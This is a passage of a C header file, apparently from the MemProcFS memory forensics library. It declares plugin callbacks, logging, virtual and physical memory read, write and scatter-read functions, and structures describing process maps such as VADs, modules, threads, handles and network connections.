    // Optional forensic plugin functionality for forensic (more comprehensive)
    // analysis of various data. Functions are optional. Functions are called
    // in single-threaded mode regards to the plugin itself - but 'ingest'
    // functions are called in-parallel multi-threaded between plugins.
    // Functions are called in the order of:
    // pfnInitialize(), pfnIngest*(), pfnTimeline(), pfnLogJSON(), pfnFinalize()
    struct {
        PVOID(*pfnInitialize)(_In_ PVMMDLL_PLUGIN_CONTEXT ctxP);
        VOID(*pfnFinalize)(_In_opt_ PVOID ctxfc);
        VOID(*pfnTimeline)(
            _In_opt_ PVOID ctxfc,
            _In_ HANDLE hTimeline,
            _In_ VOID(*pfnAddEntry)(_In_ HANDLE hTimeline, _In_ QWORD ft, _In_ DWORD dwAction, _In_ DWORD dwPID, _In_ DWORD dwData32, _In_ QWORD qwData64, _In_ LPSTR uszText),
            _In_ VOID(*pfnEntryAddBySql)(_In_ HANDLE hTimeline, _In_ DWORD cEntrySql, _In_ LPSTR *pszEntrySql));
        VOID(*pfnIngestPhysmem)(_In_opt_ PVOID ctxfc, _In_ PVMMDLL_PLUGIN_FORENSIC_INGEST_PHYSMEM pIngestPhysmem);
        VOID(*pfnIngestFinalize)(_In_opt_ PVOID ctxfc);
        PVOID pvReserved[10];
        VOID(*pfnLogJSON)(_In_ PVMMDLL_PLUGIN_CONTEXT ctxP, _In_ VOID(*pfnLogJSON)(_In_ PVMMDLL_PLUGIN_FORENSIC_JSONDATA pData));
    } reg_fnfc;
    // Additional system information - read/only by the plugins.
    struct {
        BOOL f32;
        DWORD dwVersionMajor;
        DWORD dwVersionMinor;
        DWORD dwVersionBuild;
        DWORD _Reserved[32];
    } sysinfo;
} VMMDLL_PLUGIN_REGINFO, *PVMMDLL_PLUGIN_REGINFO;



//-----------------------------------------------------------------------------
// VMM LOG FUNCTIONALITY BELOW:
// It's possible for external code (primarily external plugins) to make use of
// the MemProcFS logging system.
// ----------------------------------------------------------------------------

typedef enum tdVMMDLL_LOGLEVEL {
    VMMDLL_LOGLEVEL_CRITICAL = 1,  // critical stopping error
    VMMDLL_LOGLEVEL_WARNING  = 2,  // severe warning error
    VMMDLL_LOGLEVEL_INFO     = 3,  // normal/info message
    VMMDLL_LOGLEVEL_VERBOSE  = 4,  // verbose message (visible with -v)
    VMMDLL_LOGLEVEL_DEBUG    = 5,  // debug message (visible with -vv)
    VMMDLL_LOGLEVEL_TRACE    = 6,  // trace message
    VMMDLL_LOGLEVEL_NONE     = 7,  // do not use!
} VMMDLL_LOGLEVEL;

/*
* Log a message using the internal MemProcFS vmm logging system. Log messages
* will be displayed/suppressed depending on current logging configuration.
* -- MID = module id supplied by plugin context PVMMDLL_PLUGIN_CONTEXT or
*          id given by VMMDLL_MID_*.
* -- dwLogLevel
* -- uszFormat
* -- ...
*/
EXPORTED_FUNCTION
VOID VMMDLL_Log(
    _In_opt_ VMMDLL_MODULE_ID MID,
    _In_ VMMDLL_LOGLEVEL dwLogLevel,
    _In_z_ _Printf_format_string_ LPSTR uszFormat,
    ...
);

/*
* Log a message using the internal MemProcFS vmm logging system. Log messages
* will be displayed/suppressed depending on current logging configuration.
* -- MID = module id supplied by plugin context PVMMDLL_PLUGIN_CONTEXT or
*          id given by VMMDLL_MID_*.
* -- dwLogLevel
* -- uszFormat
* -- arglist
*/
EXPORTED_FUNCTION
VOID VMMDLL_LogEx(
    _In_opt_ VMMDLL_MODULE_ID MID,
    _In_ VMMDLL_LOGLEVEL dwLogLevel,
    _In_z_ _Printf_format_string_ LPSTR uszFormat,
    va_list arglist
);



//-----------------------------------------------------------------------------
// VMM CORE FUNCTIONALITY BELOW:
// Vmm core functaionlity such as read (and write) to both virtual and physical
// memory. NB! writing will only work if the target is supported - i.e. not a
// memory dump file...
// To read physical memory specify dwPID as (DWORD)-1
//-----------------------------------------------------------------------------

#define VMMDLL_PID_PROCESS_WITH_KERNELMEMORY        0x80000000      // Combine with dwPID to enable process kernel memory (NB! use with extreme care).

// FLAG used to supress the default read cache in calls to VMM_MemReadEx()
// which will lead to the read being fetched from the target system always.
// Cached page tables (used for translating virtual2physical) are still used.
#define VMMDLL_FLAG_NOCACHE                         0x0001  // do not use the data cache (force reading from memory acquisition device)
#define VMMDLL_FLAG_ZEROPAD_ON_FAIL                 0x0002  // zero pad failed physical memory reads and report success if read within range of physical memory.
#define VMMDLL_FLAG_FORCECACHE_READ                 0x0008  // force use of cache - fail non-cached pages - only valid for reads, invalid with VMM_FLAG_NOCACHE/VMM_FLAG_ZEROPAD_ON_FAIL.
#define VMMDLL_FLAG_NOPAGING                        0x0010  // do not try to retrieve memory from paged out memory from pagefile/compressed (even if possible)
#define VMMDLL_FLAG_NOPAGING_IO                     0x0020  // do not try to retrieve memory from paged out memory if read would incur additional I/O (even if possible).
#define VMMDLL_FLAG_NOCACHEPUT                      0x0100  // do not write back to the data cache upon successful read from memory acquisition device.
#define VMMDLL_FLAG_CACHE_RECENT_ONLY               0x0200  // only fetch from the most recent active cache region when reading.
#define VMMDLL_FLAG_NO_PREDICTIVE_READ              0x0400  // do not perform additional predictive page reads (default on smaller requests).

/*
* Read memory in various non-contigious locations specified by the pointers to
* the items in the ppMEMs array. Result for each unit of work will be given
* individually. No upper limit of number of items to read, but no performance
* boost will be given if above hardware limit. Max size of each unit of work is
* one 4k page (4096 bytes). Reads must not cross 4k page boundaries. Reads must
* start at even DWORDs (4-bytes).
* -- dwPID - PID of target process, (DWORD)-1 to read physical memory.
* -- ppMEMs = array of scatter read headers.
* -- cpMEMs = count of ppMEMs.
* -- flags = optional flags as given by VMMDLL_FLAG_*
* -- return = the number of successfully read items.
*/
EXPORTED_FUNCTION
DWORD VMMDLL_MemReadScatter(_In_ DWORD dwPID, _Inout_ PPMEM_SCATTER ppMEMs, _In_ DWORD cpMEMs, _In_ DWORD flags);

/*
* Read a single 4096-byte page of memory.
* -- dwPID - PID of target process, (DWORD)-1 to read physical memory.
* -- qwA
* -- pbPage
* -- return = success/fail (depending if all requested bytes are read or not).
*/
EXPORTED_FUNCTION _Success_(return)
BOOL VMMDLL_MemReadPage(_In_ DWORD dwPID, _In_ ULONG64 qwA, _Inout_bytecount_(4096) PBYTE pbPage);

/*
* Read a contigious arbitrary amount of memory.
* -- dwPID - PID of target process, (DWORD)-1 to read physical memory.
* -- qwA
* -- pb
* -- cb
* -- return = success/fail (depending if all requested bytes are read or not).
*/
EXPORTED_FUNCTION _Success_(return)
BOOL VMMDLL_MemRead(_In_ DWORD dwPID, _In_ ULONG64 qwA, _Out_writes_(cb) PBYTE pb, _In_ DWORD cb);

/*
* Read a contigious amount of memory and report the number of bytes read in pcbRead.
* -- dwPID - PID of target process, (DWORD)-1 to read physical memory.
* -- qwA
* -- pb
* -- cb
* -- pcbRead
* -- flags = flags as in VMMDLL_FLAG_*
* -- return = success/fail. NB! reads may report as success even if 0 bytes are
*        read - it's recommended to verify pcbReadOpt parameter.
*/
EXPORTED_FUNCTION _Success_(return)
BOOL VMMDLL_MemReadEx(_In_ DWORD dwPID, _In_ ULONG64 qwA, _Out_writes_(cb) PBYTE pb, _In_ DWORD cb, _Out_opt_ PDWORD pcbReadOpt, _In_ ULONG64 flags);

/*
* Prefetch a number of addresses (specified in the pA array) into the memory
* cache. This function is to be used to batch larger known reads into local
* cache before making multiple smaller reads - which will then happen from
* the cache. Function exists for performance reasons.
* -- dwPID = PID of target process, (DWORD)-1 for physical memory.
* -- pPrefetchAddresses = array of addresses to read into cache.
* -- cPrefetchAddresses
*/
EXPORTED_FUNCTION _Success_(return)
BOOL VMMDLL_MemPrefetchPages(_In_ DWORD dwPID, _In_reads_(cPrefetchAddresses) PULONG64 pPrefetchAddresses, _In_ DWORD cPrefetchAddresses);

/*
* Write a contigious arbitrary amount of memory. Please note some virtual memory
* such as pages of executables (such as DLLs) may be shared between different
* virtual memory over different processes. As an example a write to kernel32.dll
* in one process is likely to affect kernel32 in the whole system - in all
* processes. Heaps and Stacks and other memory are usually safe to write to.
* Please take care when writing to memory!
* -- dwPID = PID of target process, (DWORD)-1 to read physical memory.
* -- qwA
* -- pb
* -- cb
* -- return = TRUE on success, FALSE on partial or zero write.
*/
EXPORTED_FUNCTION _Success_(return)
BOOL VMMDLL_MemWrite(_In_ DWORD dwPID, _In_ ULONG64 qwA, _In_reads_(cb) PBYTE pb, _In_ DWORD cb);

/*
* Translate a virtual address to a physical address by walking the page tables
* of the specified process.
* -- dwPID
* -- qwVA
* -- pqwPA
* -- return = success/fail.
*/
EXPORTED_FUNCTION _Success_(return)
BOOL VMMDLL_MemVirt2Phys(_In_ DWORD dwPID, _In_ ULONG64 qwVA, _Out_ PULONG64 pqwPA);



//-----------------------------------------------------------------------------
// SIMPLIFIED EASIER TO USE READ SCATTER MEMORY FUNCTIONALITY BELOW:
// The flow is as following:
// 1. Call VMMDLL_Scatter_Initialize to initialize handle.
// 2. Populate memory ranges with multiple calls to VMMDLL_Scatter_Prepare
//    and/or VMMDLL_Scatter_PrepareEx functions. The memory buffer given to
//    VMMDLL_Scatter_PrepareEx will be populated with contents in step (3).
// 3. Retrieve the memory by calling VMMDLL_Scatter_ExecuteRead function.
// 4. If VMMDLL_Scatter_Prepare was used (i.e. not VMMDLL_Scatter_PrepareEx)
//    then retrieve the memory read in (3).
// 5. Clear the handle for reuse by calling VMMDLL_Scatter_Clear alternatively
//    Close the handle to free resources with VMMDLL_Scatter_CloseHandle.
// NB! buffers given to VMMDLL_Scatter_PrepareEx must not be free'd before
//     handle is closed since it may be used internally.
// NB! VMMDLL_Scatter_ExecuteRead may be called at a later point in time to
//     update (re-read) previously read data.
// NB! larger reads (up to 1 GB max) are supported but not recommended.
//-----------------------------------------------------------------------------
typedef HANDLE      VMMDLL_SCATTER_HANDLE;

/*
* Initialize a scatter handle which is used to call VMMDLL_Scatter_* functions.
* CALLER CLOSE: VMMDLL_Scatter_CloseHandle(return)
* -- dwPID - PID of target process, (DWORD)-1 to read physical memory.
* -- flags = optional flags as given by VMMDLL_FLAG_*
* -- return = handle to be used in VMMDLL_Scatter_* functions.
*/
EXPORTED_FUNCTION _Success_(return != NULL)
VMMDLL_SCATTER_HANDLE VMMDLL_Scatter_Initialize(_In_ DWORD dwPID, _In_ DWORD flags);

/*
* Prepare (add) a memory range for reading. The memory may after a call to
* VMMDLL_Scatter_ExecuteRead() be retrieved with VMMDLL_Scatter_Read().
* -- hS
* -- va = start address of the memory range to read.
* -- cb = size of memory range to read.
* -- return
*/
EXPORTED_FUNCTION _Success_(return)
BOOL VMMDLL_Scatter_Prepare(_In_ VMMDLL_SCATTER_HANDLE hS, _In_ QWORD va, _In_ DWORD cb);

/*
* Prepare (add) a memory range for reading. The buffer pb and the read length
* *pcbRead will be populated when VMMDLL_Scatter_ExecuteRead() is later called.
* NB! the buffer pb must not be deallocated before VMMDLL_Scatter_CloseHandle()
*     has been called since it's used internally by the scatter functionality!
* -- hS
* -- va = start address of the memory range to read.
* -- cb = size of memory range to read.
* -- pb = buffer to populate with read memory when calling VMMDLL_Scatter_ExecuteRead()
* -- pcbRead = pointer to be populated with number of bytes successfully read.
* -- return
*/
EXPORTED_FUNCTION _Success_(return)
BOOL VMMDLL_Scatter_PrepareEx(_In_ VMMDLL_SCATTER_HANDLE hS, _In_ QWORD va, _In_ DWORD cb, _Out_writes_opt_(cb) PBYTE pb, _Out_opt_ PDWORD pcbRead);

/*
* Retrieve the memory ranges previously populated with calls to the
* VMMDLL_Scatter_Prepare* functions.
* -- hS
* -- return
*/
EXPORTED_FUNCTION _Success_(return)
BOOL VMMDLL_Scatter_ExecuteRead(_In_ VMMDLL_SCATTER_HANDLE hS);

/*
* Read out memory in previously populated ranges. This function should only be
* called after the memory has been retrieved using VMMDLL_Scatter_ExecuteRead().
* -- hS
* -- va
* -- cb
* -- pb
* -- pcbRead
* -- return
*/
EXPORTED_FUNCTION _Success_(return)
BOOL VMMDLL_Scatter_Read(_In_ VMMDLL_SCATTER_HANDLE hS, _In_ QWORD va, _In_ DWORD cb, _Out_writes_opt_(cb) PBYTE pb, _Out_opt_ PDWORD pcbRead);

/*
* Clear/Reset the handle for use in another subsequent read scatter operation.
* -- hS = the scatter handle to clear for reuse.
* -- dwPID
* -- flags
* -- return
*/
EXPORTED_FUNCTION _Success_(return)
BOOL VMMDLL_Scatter_Clear(_In_ VMMDLL_SCATTER_HANDLE hS, _In_ DWORD dwPID, _In_ DWORD flags);

/*
* Close the scatter handle and free the resources it uses.
* -- hS = the scatter handle to close.
*/
EXPORTED_FUNCTION
VOID VMMDLL_Scatter_CloseHandle(_In_opt_ _Post_ptr_invalid_ VMMDLL_SCATTER_HANDLE hS);



//-----------------------------------------------------------------------------
// VMM PROCESS MAP FUNCTIONALITY BELOW:
// Functionality for retrieving process related collections of items such as
// page table map (PTE), virtual address descriptor map (VAD), loaded modules,
// heaps and threads.
//-----------------------------------------------------------------------------

#define VMMDLL_MAP_PTE_VERSION              2
#define VMMDLL_MAP_VAD_VERSION              6
#define VMMDLL_MAP_VADEX_VERSION            3
#define VMMDLL_MAP_MODULE_VERSION           5
#define VMMDLL_MAP_UNLOADEDMODULE_VERSION   2
#define VMMDLL_MAP_EAT_VERSION              2
#define VMMDLL_MAP_IAT_VERSION              2
#define VMMDLL_MAP_HEAP_VERSION             2
#define VMMDLL_MAP_THREAD_VERSION           3
#define VMMDLL_MAP_HANDLE_VERSION           2
#define VMMDLL_MAP_POOL_VERSION             2
#define VMMDLL_MAP_NET_VERSION              3
#define VMMDLL_MAP_PHYSMEM_VERSION          2
#define VMMDLL_MAP_USER_VERSION             2
#define VMMDLL_MAP_SERVICE_VERSION          3

// flags to check for existence in the fPage field of VMMDLL_MAP_PTEENTRY
#define VMMDLL_MEMMAP_FLAG_PAGE_W           0x0000000000000002
#define VMMDLL_MEMMAP_FLAG_PAGE_NS          0x0000000000000004
#define VMMDLL_MEMMAP_FLAG_PAGE_NX          0x8000000000000000
#define VMMDLL_MEMMAP_FLAG_PAGE_MASK        0x8000000000000006

#define VMMDLL_POOLMAP_FLAG_ALL             0
#define VMMDLL_POOLMAP_FLAG_BIG             1

typedef enum tdVMMDLL_PTE_TP {
    VMMDLL_PTE_TP_NA = 0,
    VMMDLL_PTE_TP_HARDWARE = 1,
    VMMDLL_PTE_TP_TRANSITION = 2,
    VMMDLL_PTE_TP_PROTOTYPE = 3,
    VMMDLL_PTE_TP_DEMANDZERO = 4,
    VMMDLL_PTE_TP_COMPRESSED = 5,
    VMMDLL_PTE_TP_PAGEFILE = 6,
} VMMDLL_PTE_TP, *PVMMDLL_PTE_TP;

typedef struct tdVMMDLL_MAP_PTEENTRY {
    QWORD vaBase;
    QWORD cPages;
    QWORD fPage;
    BOOL  fWoW64;
    DWORD _FutureUse1;
    union { LPSTR  uszText; LPWSTR wszText; };              // U/W dependant
    DWORD _Reserved1;
    DWORD cSoftware;    // # software (non active) PTEs in region
} VMMDLL_MAP_PTEENTRY, *PVMMDLL_MAP_PTEENTRY;

typedef struct tdVMMDLL_MAP_VADENTRY {
    QWORD vaStart;
    QWORD vaEnd;
    QWORD vaVad;
    // DWORD 0
    DWORD VadType           : 3;   // Pos 0
    DWORD Protection        : 5;   // Pos 3
    DWORD fImage            : 1;   // Pos 8
    DWORD fFile             : 1;   // Pos 9
    DWORD fPageFile         : 1;   // Pos 10
    DWORD fPrivateMemory    : 1;   // Pos 11
    DWORD fTeb              : 1;   // Pos 12
    DWORD fStack            : 1;   // Pos 13
    DWORD fSpare            : 2;   // Pos 14
    DWORD HeapNum           : 7;   // Pos 16
    DWORD fHeap             : 1;   // Pos 23
    DWORD cwszDescription   : 8;   // Pos 24
    // DWORD 1
    DWORD CommitCharge      : 31;   // Pos 0
    DWORD MemCommit         : 1;    // Pos 31
    DWORD u2;
    DWORD cbPrototypePte;
    QWORD vaPrototypePte;
    QWORD vaSubsection;
    union { LPSTR  uszText; LPWSTR wszText; };              // U/W dependant
    DWORD _FutureUse1;
    DWORD _Reserved1;
    QWORD vaFileObject;             // only valid if fFile/fImage _and_ after wszText is initialized
    DWORD cVadExPages;              // number of "valid" VadEx pages in this VAD.
    DWORD cVadExPagesBase;          // number of "valid" VadEx pages in "previous" VADs
    QWORD _Reserved2;
} VMMDLL_MAP_VADENTRY, *PVMMDLL_MAP_VADENTRY;

typedef struct tdVMMDLL_MAP_VADEXENTRY {
    VMMDLL_PTE_TP tp;
    DWORD iPML;
    QWORD va;
    QWORD pa;
    QWORD pte;
    struct {
        DWORD _Reserved1;
        VMMDLL_PTE_TP tp;
        QWORD pa;
        QWORD pte;
    } proto;
    QWORD vaVadBase;
} VMMDLL_MAP_VADEXENTRY, *PVMMDLL_MAP_VADEXENTRY;

typedef enum tdVMMDLL_MODULE_TP {
    VMMDLL_MODULE_TP_NORMAL = 0,
    VMMDLL_MODULE_TP_DATA = 1,
    VMMDLL_MODULE_TP_NOTLINKED = 2,
    VMMDLL_MODULE_TP_INJECTED = 3,
} VMMDLL_MODULE_TP;

typedef struct tdVMMDLL_MAP_MODULEENTRY {
    QWORD vaBase;
    QWORD vaEntry;
    DWORD cbImageSize;
    BOOL  fWoW64;
    union { LPSTR  uszText; LPWSTR wszText; };              // U/W dependant
    DWORD _Reserved3;
    DWORD _Reserved4;
    union { LPSTR  uszFullName; LPWSTR wszFullName; };      // U/W dependant
    VMMDLL_MODULE_TP tp;
    DWORD cbFileSizeRaw;
    DWORD cSection;
    DWORD cEAT;
    DWORD cIAT;
    DWORD _Reserved2;
    QWORD _Reserved1[2];
} VMMDLL_MAP_MODULEENTRY, *PVMMDLL_MAP_MODULEENTRY;

typedef struct tdVMMDLL_MAP_UNLOADEDMODULEENTRY {
    QWORD vaBase;
    DWORD cbImageSize;
    BOOL  fWoW64;
    union { LPSTR  uszText; LPWSTR wszText; };              // U/W dependant
    DWORD _FutureUse1;
    DWORD dwCheckSum;               // user-mode only
    DWORD dwTimeDateStamp;          // user-mode only
    DWORD _Reserved1;
    QWORD ftUnload;                 // kernel-mode only
} VMMDLL_MAP_UNLOADEDMODULEENTRY, *PVMMDLL_MAP_UNLOADEDMODULEENTRY;

typedef struct tdVMMDLL_MAP_EATENTRY {
    QWORD vaFunction;
    DWORD dwOrdinal;
    DWORD oFunctionsArray;          // PIMAGE_EXPORT_DIRECTORY->AddressOfFunctions[oFunctionsArray]
    DWORD oNamesArray;              // PIMAGE_EXPORT_DIRECTORY->AddressOfNames[oNamesArray]
    DWORD _FutureUse1;
    union { LPSTR  uszFunction; LPWSTR wszFunction; };      // U/W dependant
} VMMDLL_MAP_EATENTRY, *PVMMDLL_MAP_EATENTRY;

typedef struct tdVMMDLL_MAP_IATENTRY {
    QWORD vaFunction;
    union { LPSTR  uszFunction; LPWSTR wszFunction; };      // U/W dependant
    DWORD _FutureUse1;
    DWORD _FutureUse2;
    union { LPSTR  uszModule; LPWSTR wszModule; };          // U/W dependant
    struct {
        BOOL f32;
        WORD wHint;
        WORD _Reserved1;
        DWORD rvaFirstThunk;
        DWORD rvaOriginalFirstThunk;
        DWORD rvaNameModule;
        DWORD rvaNameFunction;
    } Thunk;
} VMMDLL_MAP_IATENTRY, *PVMMDLL_MAP_IATENTRY;

typedef struct tdVMMDLL_MAP_HEAPENTRY {
    QWORD vaHeapSegment;
    DWORD cPages;
    DWORD cPagesUnCommitted : 24;
    DWORD HeapId : 7;
    DWORD fPrimary : 1;
} VMMDLL_MAP_HEAPENTRY, *PVMMDLL_MAP_HEAPENTRY;

typedef struct tdVMMDLL_MAP_THREADENTRY {
    DWORD dwTID;
    DWORD dwPID;
    DWORD dwExitStatus;
    UCHAR bState;
    UCHAR bRunning;
    UCHAR bPriority;
    UCHAR bBasePriority;
    QWORD vaETHREAD;
    QWORD vaTeb;
    QWORD ftCreateTime;
    QWORD ftExitTime;
    QWORD vaStartAddress;
    QWORD vaStackBaseUser;          // value from _NT_TIB / _TEB
    QWORD vaStackLimitUser;         // value from _NT_TIB / _TEB
    QWORD vaStackBaseKernel;
    QWORD vaStackLimitKernel;
    QWORD vaTrapFrame;
    QWORD vaRIP;                    // RIP register (if user mode)
    QWORD vaRSP;                    // RSP register (if user mode)
    QWORD qwAffinity;
    DWORD dwUserTime;
    DWORD dwKernelTime;
    UCHAR bSuspendCount;
    UCHAR _FutureUse1[3];
    DWORD _FutureUse2[15];
} VMMDLL_MAP_THREADENTRY, *PVMMDLL_MAP_THREADENTRY;

typedef struct tdVMMDLL_MAP_HANDLEENTRY {
    QWORD vaObject;
    DWORD dwHandle;
    DWORD dwGrantedAccess : 24;
    DWORD iType : 8;
    QWORD qwHandleCount;
    QWORD qwPointerCount;
    QWORD vaObjectCreateInfo;
    QWORD vaSecurityDescriptor;
    union { LPSTR  uszText; LPWSTR wszText; };              // U/W dependant
    DWORD _FutureUse2;
    DWORD dwPID;
    DWORD dwPoolTag;
    DWORD _FutureUse[5];
    union { LPSTR  uszType; LPWSTR wszType; QWORD _Pad1; }; // U/W dependant
} VMMDLL_MAP_HANDLEENTRY, *PVMMDLL_MAP_HANDLEENTRY;

typedef enum tdVMMDLL_MAP_POOL_TYPE {
    VMMDLL_MAP_POOL_TYPE_Unknown         = 0,
    VMMDLL_MAP_POOL_TYPE_NonPagedPool    = 1,
    VMMDLL_MAP_POOL_TYPE_NonPagedPoolNx  = 2,
    VMMDLL_MAP_POOL_TYPE_PagedPool       = 3
} VMMDLL_MAP_POOL_TYPE;

typedef enum tdVMM_MAP_POOL_TYPE_SUBSEGMENT {
    VMM_MAP_POOL_TYPE_SUBSEGMENT_UNKNOWN = 0,
    VMM_MAP_POOL_TYPE_SUBSEGMENT_NA      = 1,
    VMM_MAP_POOL_TYPE_SUBSEGMENT_BIG     = 2,
    VMM_MAP_POOL_TYPE_SUBSEGMENT_LARGE   = 3,
    VMM_MAP_POOL_TYPE_SUBSEGMENT_VS      = 4,
    VMM_MAP_POOL_TYPE_SUBSEGMENT_LFH     = 5
} VMM_MAP_POOL_TYPE_SUBSEGMENT;

typedef struct tdVMMDLL_MAP_POOLENTRYTAG {
    union {
        CHAR szTag[5];
        struct {
            DWORD dwTag;
            DWORD _Filler;
            DWORD cEntry;
            DWORD iTag2Map;
        };
    };
} VMMDLL_MAP_POOLENTRYTAG, *PVMMDLL_MAP_POOLENTRYTAG;

typedef struct tdVMMDLL_MAP_POOLENTRY {
    QWORD va;
    union {
        CHAR szTag[5];
        struct {
            DWORD dwTag;
            BYTE _ReservedZero;
            BYTE fAlloc;
            BYTE tpPool;    // VMMDLL_MAP_POOL_TYPE
            BYTE tpSS;      // VMMDLL_MAP_POOL_TYPE_SUBSEGMENT
        };
    };
    DWORD cb;
    DWORD _Filler;
} VMMDLL_MAP_POOLENTRY, *PVMMDLL_MAP_POOLENTRY;

typedef struct tdVMMDLL_MAP_NETENTRY {
    DWORD dwPID;
    DWORD dwState;
    WORD _FutureUse3[3];
    WORD AF;                        // address family (IPv4/IPv6)
    struct {
        BOOL fValid;
        WORD _Reserved;
        WORD port;
        BYTE pbAddr[16];            // ipv4 = 1st 4 bytes, ipv6 = all bytes
        union { LPSTR  uszText; LPWSTR wszText; };          // U/W dependant
    } Src;
    struct {
        BOOL fValid;
        WORD _Reserved;
        WORD port;
        BYTE pbAddr[16];            // ipv4 = 1st 4 bytes, ipv6 = all bytes
        union { LPSTR  uszText; LPWSTR wszText; };          // U/W dependant
    } Dst;
    QWORD vaObj;
    QWORD ftTime;
    DWORD dwPoolTag;
    DWORD _FutureUse4;
    union { LPSTR  uszText; LPWSTR wszText; };              // U/W dependant
    DWORD _FutureUse2[4];
} VMMDLL_MAP_NETENTRY, *PVMMDLL_MAP_NETENTRY;

typedef struct tdVMMDLL_MAP_PHYSMEMENTRY {
    QWORD pa;
    QWORD cb;
} VMMDLL_MAP_PHYSMEMENTRY, *PVMMDLL_MAP_PHYSMEMENTRY;

typedef struct tdVMMDLL_MAP_USERENTRY {
    DWORD _FutureUse1[2];
    union { LPSTR  uszText; LPWSTR wszText; };              // U/W dependant
    ULONG64 vaRegHive;
    union { LPSTR  uszSID; LPWSTR wszSID; };                // U/W dependant
    DWORD _FutureUse2[2];
} VMMDLL_MAP_USERENTRY, *PVMMDLL_MAP_USERENTRY;

typedef struct tdVMMDLL_MAP_SERVICEENTRY {
    QWORD vaObj;
    DWORD dwOrdinal;
    DWORD dwStartType;
    SERVICE_STATUS ServiceStatus;
    union { LPSTR  uszServiceName; LPWSTR wszServiceName; QWORD _Reserved1; };  // U/W dependant
    union { LPSTR  uszDisplayName; LPWSTR wszDisplayName; QWORD _Reserved2; };  // U/W dependant
    union { LPSTR  uszPath;        LPWSTR wszPath;        QWORD _Reserved3; };  // U/W dependant
    union { LPSTR  uszUserTp;      LPWSTR wszUserTp;      QWORD _Reserved4; };  // U/W dependant
    union { LPSTR  uszUserAcct;    LPWSTR wszUserAcct;    QWORD _Reserved5; };  // U/W dependant
    union { LPSTR  uszImagePath;   LPWSTR wszImagePath;   QWORD _Reserved6; };  // U/W dependant
    DWORD dwPID;
    DWORD _FutureUse1;
    QWORD _FutureUse2;
} VMMDLL_MAP_SERVICEENTRY, *PVMMDLL_MAP_SERVICEENTRY;

typedef struct tdVMMDLL_MAP_PTE {
    DWORD dwVersion;
    DWORD _Reserved1[5];
    PBYTE pbMultiText;              // NULL or multi-wstr pointed into by VMMDLL_MAP_VADENTRY.wszText
    DWORD cbMultiText;
    DWORD cMap;                     // # map entries.
    VMMDLL_MAP_PTEENTRY pMap[];     // map entries.
} VMMDLL_MAP_PTE, *PVMMDLL_MAP_PTE;

typedef struct tdVMMDLL_MAP_VAD {
    DWORD dwVersion;
    DWORD _Reserved1[4];
    DWORD cPage;                    // # pages in vad map.
    PBYTE pbMultiText;              // NULL or multi-wstr pointed into by VMMDLL_MAP_VADENTRY.wszText
    DWORD cbMultiText;
    DWORD cMap;                     // # map entries.
    VMMDLL_MAP_VADENTRY pMap[];     // map entries.
} VMMDLL_MAP_VAD, *PVMMDLL_MAP_VAD;

typedef struct tdVMMDLL_MAP_VADEX {
    DWORD dwVersion;
    DWORD _Reserved1[4];
    DWORD cMap;                     // # map entries.
    VMMDLL_MAP_VADEXENTRY pMap[];   // map entries.
} VMMDLL_MAP_VADEX, *PVMMDLL_MAP_VADEX;

typedef struct tdVMMDLL_MAP_MODULE {
    DWORD dwVersion;
    DWORD _Reserved1[5];
    PBYTE pbMultiText;              // multi-wstr pointed into by VMMDLL_MAP_MODULEENTRY.wszText
    DWORD cbMultiText;
    DWORD cMap;                     // # map entries.
    VMMDLL_MAP_MODULEENTRY pMap[];  // map entries.
} VMMDLL_MAP_MODULE, *PVMMDLL_MAP_MODULE;

typedef struct tdVMMDLL_MAP_UNLOADEDMODULE {
    DWORD dwVersion;
    DWORD _Reserved1[5];
    PBYTE pbMultiText;              // multi-wstr pointed into by VMMDLL_MAP_MODULEENTRY.wszText
    DWORD cbMultiText;
    DWORD cMap;                     // # map entries.
    VMMDLL_MAP_UNLOADEDMODULEENTRY pMap[];  // map entries.
} VMMDLL_MAP_UNLOADEDMODULE, *PVMMDLL_MAP_UNLOADEDMODULE;

typedef struct tdVMMDLL_MAP_EAT {
    DWORD dwVersion;
    DWORD dwOrdinalBase;
    DWORD cNumberOfNames;
    DWORD cNumberOfFunctions;
    DWORD _Reserved1[4];
    QWORD vaModuleBase;
    QWORD vaAddressOfFunctions;
    QWORD vaAddressOfNames;
    PBYTE pbMultiText;              // multi-str pointed into by VMM_MAP_EATENTRY.wszFunction
    DWORD cbMultiText;
    DWORD cMap;                     // # map entries.
    VMMDLL_MAP_EATENTRY pMap[];     // map entries.
} VMMDLL_MAP_EAT, *PVMMDLL_MAP_EAT;

typedef struct tdVMMDLL_MAP_IAT {
    DWORD dwVersion;
    DWORD _Reserved1[5];
    QWORD vaModuleBase;
    PBYTE pbMultiText;              // multi-str pointed into by VMM_MAP_EATENTRY.[wszFunction|wszModule]
    DWORD cbMultiText;
    DWORD cMap;                     // # map entries.
    VMMDLL_MAP_IATENTRY pMap[];     // map entries.
} VMMDLL_MAP_IAT, *PVMMDLL_MAP_IAT;

typedef struct tdVMMDLL_MAP_HEAP {
    DWORD dwVersion;
    DWORD _Reserved1[8];
    DWORD cMap;                     // # map entries.
    VMMDLL_MAP_HEAPENTRY pMap[];    // map entries.
} VMMDLL_MAP_HEAP, *PVMMDLL_MAP_HEAP;

typedef struct tdVMMDLL_MAP_THREAD {
    DWORD dwVersion;
    DWORD _Reserved[8];
    DWORD cMap;                     // # map entries.
    VMMDLL_MAP_THREADENTRY pMap[];  // map entries.
} VMMDLL_MAP_THREAD, *PVMMDLL_MAP_THREAD;

typedef struct tdVMMDLL_MAP_HANDLE {
    DWORD dwVersion;
    DWORD _Reserved1[5];
    PBYTE pbMultiText;              // multi-wstr pointed into by VMMDLL_MAP_HANDLEENTRY.wszText
    DWORD cbMultiText;
    DWORD cMap;                     // # map entries.
    VMMDLL_MAP_HANDLEENTRY pMap[];  // map entries.
} VMMDLL_MAP_HANDLE, *PVMMDLL_MAP_HANDLE;

typedef struct tdVMMDLL_MAP_POOL {
    DWORD dwVersion;
    DWORD _Reserved1[6];
    DWORD cbTotal;                  // # bytes to represent this pool map object
    PDWORD piTag2Map;               // dword map array (size: cMap): tag index to map index.
    PVMMDLL_MAP_POOLENTRYTAG pTag;  // tag entries.
    DWORD cTag;                     // # tag entries.
    DWORD cMap;                     // # map entries.
    VMMDLL_MAP_POOLENTRY pMap[];    // map entries.
} VMMDLL_MAP_POOL, *PVMMDLL_MAP_POOL;

typedef struct tdVMMDLL_MAP_NET {
    DWORD dwVersion;
    DWORD _Reserved1;
    PBYTE pbMultiText;              // multi-wstr pointed into by VMM_MAP_NETENTRY.wszText
    DWORD cbMultiText;
    DWORD cMap;                     // # map entries.
